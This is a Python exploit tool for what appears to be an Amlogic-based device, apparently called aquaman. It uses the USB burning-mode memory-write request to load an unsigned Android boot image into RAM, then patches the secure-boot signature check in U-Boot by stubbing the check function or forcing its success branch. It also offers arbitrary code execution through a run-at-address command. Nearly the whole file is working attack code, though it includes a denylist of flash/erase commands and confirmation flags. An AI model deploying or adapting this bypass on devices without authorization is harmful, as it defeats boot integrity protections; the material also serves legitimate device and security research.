#!/usr/bin/env python3
"""aq_usbdl.py - amlogic-usbdl style loader for aquaman's stage-16 USB gadget.

The upstream exploit (frederic/amlogic-usbdl) overflows AM_REQ_WR_LARGE_MEM in
BootROM to hijack a return address. aquaman never reaches BootROM USB here:
`fastboot oem update 5000` enumerates 1b8e:c003 at stage 16 (BL33/U-Boot), whose
v2 driver recomputes wIndex from the declared length, so that bug is absent.

The idea survives: use 0x11 to write unsigned code/data anywhere in RAM, then
skip the signature gate instead of hijacking a return address. This tool writes
a plaintext Android image to 0x1080000, patches the gate, flushes both caches
via U-Boot's own commands, and starts `bootm` over the same USB link.

Two gate patches are available. The default `entry` mode replaces the entry of
aml_sec_boot_check (0x37e19ea8) with `mov w0,#0; ret`. The narrower `cbz` mode
leaves that wrapper intact and turns the `cbz w0, success` after the call in
do_bootm (0x37e24cf8) into `b success`, preserving the SMC decrypt and the
dcache flush in the wrapper's tail. Select it with `--patch cbz` on `boot`, or
apply it with the standalone `patch-cbz` verb.

No flash/erase/saveenv/setenv/efuse. `reboot` uses the v2 optimus reset handler
instead of U-Boot's broken do_reset stub. 0x05 RUN_IN_ADDR is only available
behind the explicit `run` verb and powers off the USB PHY before jumping.

Requires the device already in optimus mode (1b8e:c003, stage 16), root on the
host, and pyusb. See reports/usbdl-port-aquaman-2026-11-26.md.
"""
import hashlib
import struct
import sys
import time

import usb.core
import usb.util

VID, PID = 0x1B8E, 0xC003

RT_OUT, RT_IN = 0x40, 0xC0

REQ_READ_MEM = 0x02
REQ_RUN_IN_ADDR = 0x05
REQ_WR_LARGE_MEM = 0x11
REQ_IDENTIFY = 0x20
REQ_TPL_CMD = 0x30
REQ_TPL_STAT = 0x31
REQ_BULKCMD = 0x34

BULK_IN_EP = 0x81
BULK_OUT_EP = 0x02
BULK_REPLY = 512
CMD_DATA = 64
MAX_RD = 64
PAGE = 2048

# aquaman PI.2055, BL33 loaded at 0x37e18000
SEC_CHECK = 0x37E19EA8
SEC_CHECK_PATCH = bytes.fromhex("00008052c0035fd6")  # mov w0,#0 ; ret

# do_bootm: bl 0x37e19ea8 at 0x37e24cf0, mov x20,x0 at 0x37e24cf4, then the
# gate at 0x37e24cf8. From the BL33 dump: cbz w0, 0x37e24d10 (success path,
# get_avb_mode/avb2); fallthrough prints "aml log : Sig Check %d".
CBZ_ADDR = 0x37E24CF8
CBZ_BYTES = bytes.fromhex("c0000034")  # cbz w0, #(0x18 -> 0x37e24d10)
CBZ_TARGET = 0x37E24D10

LOAD_ADDR = 0x1080000
ARM64_MAGIC = 0x644D5241

DENY = ("flash", "erase", "format", "saveenv", "setenv", "efuse",
        "write_raw_img", "simg2part", "burn_complete", "save_setting",
        "key", "update", "disk_initial", "low_power", "reset",
        "poweroff", "reboot", "bootm")


def die(msg):
    print(msg, file=sys.stderr)
    raise SystemExit(2)


def find():
    dev = usb.core.find(idVendor=VID, idProduct=PID)
    if dev is None:
        die("no 1b8e:c003 on the bus; enter optimus with 'fastboot oem update 5000'")
    try:
        dev.is_kernel_driver_active(0)
        dev.detach_kernel_driver(0)
    except (usb.core.USBError, NotImplementedError, AttributeError):
        pass
    if dev.get_active_configuration() is None:
        dev.set_configuration()
    return dev


def identify(dev):
    d = bytes(dev.ctrl_transfer(RT_IN, REQ_IDENTIFY, 0, 0, 4, 2000))
    if len(d) != 4:
        die("identify returned %r" % d.hex())
    stage = (d[2] << 8) | d[3]
    print("raw     %s" % " ".join("%02x" % b for b in d))
    print("version %d.%d" % (d[0], d[1]))
    print("stage   %d (%s)" % (stage, {0: "IPL/BL1", 8: "SPL/BL2",
                                       16: "TPL/BL33-u-boot"}.get(stage, "?")))
    return stage


def read_mem(dev, addr, length):
    if not 0 <= length <= MAX_RD:
        die("read length must be 1..%d" % MAX_RD)
    return bytes(dev.ctrl_transfer(RT_IN, REQ_READ_MEM,
                                   (addr >> 16) & 0xFFFF, addr & 0xFFFF,
                                   length, 5000))


def blk_chunks(total):
    """Mirror DWC_BLK_LEN/DWC_BLK_NUM from v2_usb_tool/usb_pcd.c:20-22."""
    out = []
    left = total
    while left >= 0x1000:
        out.append(0x1000)
        left -= 0x1000
    while left >= 512:
        out.append(512)
        left -= 512
    if left:
        out.append(left)
    return out


def write_large(dev, addr, data, dry=False):
    """AM_REQ_WR_LARGE_MEM: 16-byte header on EP0, payload on bulk OUT EP2."""
    hdr = struct.pack("<IIII", addr, len(data), 0, 0)
    chunks = blk_chunks(len(data))
    w_value = 0x1000
    w_index = len(chunks) & 0xFFFF
    print("ctrl OUT 0x40/0x11 wValue=0x%04x wIndex=%d wLength=16 hdr=%s"
          % (w_value, w_index, hdr.hex(" ")))
    print("bulk OUT 0x02 chunks=%s total=%d" %
          ("+".join("0x%x" % c for c in chunks[:6]) + ("..." if len(chunks) > 6 else ""),
           len(data)))
    if dry:
        return
    dev.ctrl_transfer(RT_OUT, REQ_WR_LARGE_MEM, w_value, w_index, hdr, 5000)
    off = 0
    for size in chunks:
        view = data[off:off + size]
        done = 0
        while done < size:
            n = dev.write(BULK_OUT_EP, view[done:], 10000)
            if n <= 0:
                die("bulk OUT stopped at %d of %d" % (off + done, len(data)))
            done += n
        off += size
    print("wrote %d bytes at 0x%08x" % (len(data), addr))


def bulkcmd(dev, cmd, dry=False):
    """AM_REQ_BULKCMD: 64-byte command on EP0, 512-byte reply on EP1 IN."""
    if len(cmd) >= CMD_DATA:
        die("command does not fit %d bytes" % CMD_DATA)
    head = cmd.split()[0] if cmd.split() else ""
    if head in DENY:
        die("refused, %r is denylisted; use `boot` or `patch-secboot`" % head)
    print("ctrl OUT 0x40/0x34 wValue=0 wIndex=2 cmd=%r" % cmd)
    if dry:
        return
    dev.ctrl_transfer(RT_OUT, REQ_BULKCMD, 0, 2,
                      cmd.encode() + b"\0" * (CMD_DATA - len(cmd)), 5000)
    reply = bytes(dev.read(BULK_IN_EP, BULK_REPLY, 15000))
    print("reply:", reply.split(b"\0")[0].decode("ascii", "replace"))


def bulkcmd_raw(dev, cmd):
    """Same framing as bulkcmd, no denylist. Only used for the fixed bootm verb."""
    if len(cmd) >= CMD_DATA:
        die("command does not fit %d bytes" % CMD_DATA)
    print("ctrl OUT 0x40/0x34 wValue=0 wIndex=2 cmd=%r" % cmd)
    dev.ctrl_transfer(RT_OUT, REQ_BULKCMD, 0, 2,
                      cmd.encode() + b"\0" * (CMD_DATA - len(cmd)), 5000)
    reply = bytes(dev.read(BULK_IN_EP, BULK_REPLY, 15000))
    print("reply:", reply.split(b"\0")[0].decode("ascii", "replace"))


def append_bootargs(dev, value, dry, yes):
    if not yes:
        die("refused: appendbootargs changes live boot state, pass --yes")
    escaped = value.replace('"', '\\"')
    cmd = 'setenv bootargs "$bootargs %s"' % escaped
    if len(cmd) >= CMD_DATA or "$" in value:
        die("value does not fit or contains unsupported characters")
    print("cmd:", cmd)
    if not dry:
        dev.ctrl_transfer(RT_OUT, REQ_BULKCMD, 0, 2,
                          cmd.encode() + b"\0" * (CMD_DATA - len(cmd)), 5000)
        reply = bytes(dev.read(BULK_IN_EP, BULK_REPLY, 15000))
        print("  reply:", reply.split(b"\0")[0].decode("ascii", "replace"))


def import_bootargs(dev, path, dry, yes):
    """Replace bootargs in RAM from a file, in chunks, no saveenv."""
    if not yes:
        die("refused: importbootargs changes live boot state, pass --yes")
    value = open(path, "rb").read().split(b"\0")[0].decode().strip()
    chunks = [value[i:i + 26] for i in range(0, len(value), 26)]
    for i, chunk in enumerate(chunks):
        if i == 0:
            cmd = "setenv bootargs '%s'" % chunk
        else:
            # No injected separator: the chunk already holds its own spaces.
            # ${bootargs} is required because hush would read $bootargs<chunk>
            # as one variable name. A space after $bootargs used to split
            # tokens such as skip_initramfs at chunk boundaries.
            cmd = 'setenv bootargs "${bootargs}%s"' % chunk.replace('"', '\\"')
        if len(cmd) >= CMD_DATA:
            die("chunk %d too long for the command buffer" % i)
        if not dry:
            dev.ctrl_transfer(RT_OUT, REQ_BULKCMD, 0, 2,
                              cmd.encode() + b"\0" * (CMD_DATA - len(cmd)), 5000)
            reply = bytes(dev.read(BULK_IN_EP, BULK_REPLY, 15000))
            text = reply.split(b"\0")[0].decode("ascii", "replace")
            if not text.startswith("success"):
                die("setenv chunk %d failed: %s" % (i, text))
    print("bootargs imported in %d chunks (%d bytes)" % (len(chunks), len(value)))


def set_bootargs(dev, value, dry, yes):
    """Set U-Boot env bootargs in RAM chunks, no saveenv.

    The optimus command buffer is 64 bytes, so a full cmdline has to be
    assembled incrementally with $bootargs expansion.
    """
    if not yes:
        die("refused: setbootargs changes live boot state, pass --yes")
    if '"' in value or "'" in value or "$" in value:
        die("quotes and $ are not supported in the chunked form")
    chunks = [value[i:i + 30] for i in range(0, len(value), 30)]
    for i, chunk in enumerate(chunks):
        cmd = ("setenv bootargs '%s'" % chunk) if i == 0 else \
              ("setenv bootargs \"$bootargs %s\"" % chunk)
        if len(cmd) >= CMD_DATA:
            die("chunk too long for the command buffer")
        print("cmd:", cmd)
        if not dry:
            dev.ctrl_transfer(RT_OUT, REQ_BULKCMD, 0, 2,
                              cmd.encode() + b"\0" * (CMD_DATA - len(cmd)), 5000)
            reply = bytes(dev.read(BULK_IN_EP, BULK_REPLY, 15000))
            text = reply.split(b"\0")[0].decode("ascii", "replace")
            print("  reply:", text)
            if not text.startswith("success"):
                die("setenv chunk %d failed: %s" % (i, text))


def tplcmd(dev, cmd, dry=False):
    """AM_REQ_TPL_CMD wIndex=1 -> optimus_working -> run_command.

    The v2 handler disconnects USB when the command starts with 'bootm', so no
    reply is expected on that path.
    """
    if len(cmd) >= CMD_DATA:
        die("command does not fit %d bytes" % CMD_DATA)
    head = cmd.split()[0] if cmd.split() else ""
    if head in DENY and not head == "bootm":
        die("refused, %r is denylisted" % head)
    print("ctrl OUT 0x40/0x30 wValue=0 wIndex=1 cmd=%r" % cmd)
    if not dry:
        dev.ctrl_transfer(RT_OUT, REQ_TPL_CMD, 0, 1,
                          cmd.encode() + b"\0" * (CMD_DATA - len(cmd)), 5000)


def mkimg(kernel, out, ramdisk=None, second=None, cmdline=""):
    """Build a minimal Android boot.img with a plaintext ARM64 Image.

    Header v0/v1 layout, 2048-byte pages. Components are page-aligned. No
    AMLSECU wrapper: do_bootm with the patched sec check passes it through.
    """
    if kernel[:8] != b"ANDROID!" and struct.unpack_from("<I", kernel, 0x38)[0] != ARM64_MAGIC:
        die("kernel is not a plaintext ARM64 Image (no 'ARMd' at +0x38)")
    hdr = bytearray(PAGE)
    hdr[:8] = b"ANDROID!"
    ramdisk = ramdisk or b""
    second = second or b""

    def align(b):
        return b + b"\0" * ((-len(b)) % PAGE)

    body = align(kernel) + align(ramdisk) + align(second)
    struct.pack_into("<IIIIIIIII", hdr, 8,
                     len(kernel), LOAD_ADDR,
                     len(ramdisk), 0x1000000,
                     len(second), 0xF00000,
                     0x100, PAGE, 1)
    hdr[64:64 + len(cmdline)] = cmdline.encode()
    with open(out, "wb") as f:
        f.write(hdr + body)
    print("wrote %s (%d bytes, kernel=%d ramdisk=%d second=%d)"
          % (out, PAGE + len(body), len(kernel), len(ramdisk), len(second)))


def do_patch(dev, dry, yes):
    if not yes:
        die("refused: patch-secboot writes to BL33 code, pass --yes")
    write_large(dev, SEC_CHECK, SEC_CHECK_PATCH, dry)
    print("patch bytes:", SEC_CHECK_PATCH.hex(" "))
    if dry:
        return
    bulkcmd(dev, "dcache flush", False)
    bulkcmd(dev, "icache flush", False)
    got = read_mem(dev, SEC_CHECK, 8)
    print("readback  :", got.hex(" "))
    if got != SEC_CHECK_PATCH:
        print("WARNING: readback differs from patch", file=sys.stderr)


def cbz_to_b(raw, addr):
    """Turn `cbz w0, target` at addr into `b target`. Return (bytes, target)."""
    if len(raw) != 4:
        die("expected 4 bytes to decode a cbz")
    w = struct.unpack("<I", raw)[0]
    if w >> 24 != 0x34 or w & 0x1F != 0:
        die("bytes at 0x%08x are not cbz w0: %s" % (addr, raw.hex(" ")))
    imm19 = (w >> 5) & 0x7FFFF
    if imm19 & 0x40000:
        imm19 -= 0x80000
    target = addr + (imm19 << 2)
    off = (target - addr) >> 2
    if not 0 <= off < (1 << 26):
        die("cbz target 0x%08x is out of b range" % target)
    return struct.pack("<I", 0x14000000 | off), target


def do_patch_cbz(dev, dry, yes):
    """Narrow gate patch: keep aml_sec_boot_check intact, force its success branch."""
    if not yes:
        die("refused: patch-cbz writes to BL33 code, pass --yes")
    raw = CBZ_BYTES if dry else read_mem(dev, CBZ_ADDR, 4)
    patch, target = cbz_to_b(raw, CBZ_ADDR)
    if target != CBZ_TARGET:
        die("cbz at 0x%08x targets 0x%08x, expected 0x%08x; refusing"
            % (CBZ_ADDR, target, CBZ_TARGET))
    print("cbz site 0x%08x: %s -> b 0x%08x (%s)"
          % (CBZ_ADDR, raw.hex(" "), target, patch.hex(" ")))
    print("aml_sec_boot_check at 0x%08x left untouched" % SEC_CHECK)
    if dry:
        print("dry-run: would write 4 bytes, dcache flush, icache flush, readback")
        return
    write_large(dev, CBZ_ADDR, patch, False)
    bulkcmd(dev, "dcache flush", False)
    bulkcmd(dev, "icache flush", False)
    got = read_mem(dev, CBZ_ADDR, 4)
    print("readback  :", got.hex(" "))
    if got != patch:
        print("WARNING: readback differs from patch", file=sys.stderr)


def do_boot(dev, path, addr, dry, yes, via_bulk=False, patch_mode="entry"):
    if not yes:
        die("refused: booting an image changes live execution, pass --yes")
    data = open(path, "rb").read()
    if data[:8] != b"ANDROID!":
        die("%s has no ANDROID! header" % path)
    print("image sha256", hashlib.sha256(data).hexdigest())
    write_large(dev, addr, data, dry)
    if dry:
        site = CBZ_ADDR if patch_mode == "cbz" else SEC_CHECK
        print("would patch 0x%08x (%s), flush caches, bootm 0x%x"
              % (site, patch_mode, addr))
        return
    if patch_mode == "cbz":
        do_patch_cbz(dev, False, True)
    else:
        do_patch(dev, False, True)
    if via_bulk:
        bulkcmd_raw(dev, "bootm 0x%x" % addr)
        print("bootm returned over the reply channel")
    else:
        tplcmd(dev, "bootm 0x%x" % addr, False)
        print("bootm sent; USB will disconnect if the command was accepted")


def do_reboot(dev, dry, yes):
    """v2 optimus_working intercepts 'reset' and calls optimus_reset.

    U-Boot's own do_reset is a stub on this build; this path goes through the
    burning dispatcher instead and performs a real normal reboot.
    """
    if not yes:
        die("refused: reset reboots the device, pass --yes")
    cmd = "reset"
    print("ctrl OUT 0x40/0x30 wValue=0 wIndex=1 cmd='reset'")
    if not dry:
        dev.ctrl_transfer(RT_OUT, REQ_TPL_CMD, 0, 1,
                          cmd.encode() + b"\0" * (CMD_DATA - len(cmd)), 5000)
        print("reset sent; the gadget disconnects and the stick reboots")


def do_run(dev, addr, path, dry, yes):
    if not yes:
        die("refused: 0x05 powers off the USB PHY, pass --yes")
    data = open(path, "rb").read()
    write_large(dev, addr, data, dry)
    print("ctrl OUT 0x40/0x05 wValue=0x%04x wIndex=0x%04x flags=0x10"
          % ((addr >> 16) & 0xFFFF, addr & 0xFFFF))
    if not dry:
        dev.ctrl_transfer(RT_OUT, REQ_RUN_IN_ADDR,
                          (addr >> 16) & 0xFFFF, addr & 0xFFFF,
                          struct.pack("<I", 0x10) + b"\0" * 12, 5000)
        print("payload called; USB PHY is off, do not expect a reply")


def main():
    a = sys.argv[1:]
    dry = "--dry-run" in a
    yes = "--yes" in a
    boot_flag = "--boot" in a
    patch_mode = "entry"
    if "--patch" in a:
        i = a.index("--patch")
        if i + 1 >= len(a):
            die("--patch needs a value: entry or cbz")
        patch_mode = a[i + 1]
        a = a[:i] + a[i + 2:]
        if patch_mode not in ("entry", "cbz"):
            die("unknown patch mode %r (use entry or cbz)" % patch_mode)
    a = [x for x in a if x not in ("--dry-run", "--yes", "--boot")]
    if not a:
        print(__doc__)
        return 2

    verb = a[0]
    if verb == "mkimg":
        if len(a) < 3:
            die("usage: mkimg <kernel-Image> <out.img> [--ramdisk f] [--second f] [--cmdline s]")
        kernel = open(a[1], "rb").read()
        rd = sec = None
        cmdline = ""
        for i in range(2, len(a) - 1):
            if a[i] == "--ramdisk":
                rd = open(a[i + 1], "rb").read()
            elif a[i] == "--second":
                sec = open(a[i + 1], "rb").read()
            elif a[i] == "--cmdline":
                cmdline = a[i + 1]
        mkimg(kernel, a[2], rd, sec, cmdline)
        return 0

    if dry:
        dev = None
    else:
        dev = find()

    if verb == "identify":
        if dry:
            print("dry-run: would send ctrl IN 0xc0/0x20, expect 00 07 00 10")
            return 0
        return 0 if identify(dev) == 16 else 1
    if verb == "read":
        if len(a) != 3:
            die("usage: read <addr> <len>")
        b = read_mem(dev, int(a[1], 0), int(a[2], 0))
        print("%08x  %s" % (int(a[1], 0), b.hex(" ")))
        return 0
    if verb == "write":
        if len(a) != 3:
            die("usage: [--yes] write <addr> <file>")
        if not yes:
            die("refused: RAM write needs --yes")
        write_large(dev, int(a[1], 0), open(a[2], "rb").read(), dry)
        return 0
    if verb == "cmd":
        if len(a) < 2:
            die("usage: cmd '<u-boot command>'")
        bulkcmd(dev, " ".join(a[1:]), dry)
        return 0
    if verb == "tpl":
        if len(a) < 2:
            die("usage: tpl '<u-boot command>'")
        tplcmd(dev, " ".join(a[1:]), dry)
        return 0
    if verb == "patch-secboot":
        do_patch(dev, dry, yes)
        return 0
    if verb == "patch-cbz":
        do_patch_cbz(dev, dry, yes)
        return 0
    if verb in ("boot", "bootm"):
        if not boot_flag:
            die("refused: boot also needs --boot")
        if len(a) != 2:
            die("usage: [--yes --boot] [--patch entry|cbz] %s <boot.img>" % verb)
        do_boot(dev, a[1], LOAD_ADDR, dry, yes,
                via_bulk=(verb == "bootm"), patch_mode=patch_mode)
        return 0
    if verb == "run":
        if len(a) != 3:
            die("usage: [--yes] run <addr> <payload.bin>")
        do_run(dev, int(a[1], 0), a[2], dry, yes)
        return 0
    if verb == "reboot":
        do_reboot(dev, dry, yes)
        return 0
    if verb == "setbootargs":
        if len(a) < 2:
            die("usage: [--yes] setbootargs '<cmdline>'")
        set_bootargs(dev, " ".join(a[1:]), dry, yes)
        return 0
    if verb == "appendbootargs":
        if len(a) != 2:
            die("usage: [--yes] appendbootargs '<fragment>'")
        append_bootargs(dev, a[1], dry, yes)
        return 0
    if verb == "importbootargs":
        if len(a) != 2:
            die("usage: [--yes] importbootargs <file>")
        import_bootargs(dev, a[1], dry, yes)
        return 0

    print(__doc__)
    return 2


if __name__ == "__main__":
    try:
        sys.exit(main())
    except usb.core.USBError as e:
        print("USBError: %s" % e, file=sys.stderr)
        raise SystemExit(3)
